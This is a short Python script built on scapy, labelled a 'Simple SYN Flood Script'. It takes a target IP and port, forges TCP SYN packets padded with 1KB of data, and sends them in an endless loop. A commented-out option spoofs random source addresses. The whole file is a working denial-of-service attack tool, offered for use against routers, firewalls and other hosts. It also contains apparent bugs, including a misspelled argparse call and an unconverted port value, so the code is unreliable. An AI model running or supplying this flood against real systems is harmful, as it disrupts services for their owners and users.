#!/usr/bin/env python
#---imports---#
from scapy.all import *
import argparse
parser = argparse.ArgumentParser(description = "Simple SYN Flood Script")
parser.add_argument("target_ip", help = "Target IP address(e.g router's IP, firewall, Intrusion Prevention System(IPS), etc...)")
parser.add_argument("-p", "--port", help = "Description port (the port of the target's mechine services(e.g. 80 for HTTP, 22 for SSH and so on). ")	
#parse arguments from the command line
args = parser.parse_arg()

# target ip address
target_ip = args.target_ip
#target port you want flood
target_port = args.port
#forge ip packet with target ip as the destination IP address
ip = IP(dst=target_ip)
#or if you want to perform a spoofing (will work as well)
#ip = IP(src=RandIP("192.168.1.1/24"), dst=target_ip)
#forge a TCP SYN packet with a random source port
#and the target port as the destination port
tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
#Add some flooding data (1KB in this case, don't increase it too much,
#otherwise, it won't work).
raw = Raw(b"X" * 1024)
#stack up layers
p = ip / tcp / raw
#sends the contructed packet in a loop until CTRL+C is detected.
send(p, loop=1, verbose=0)
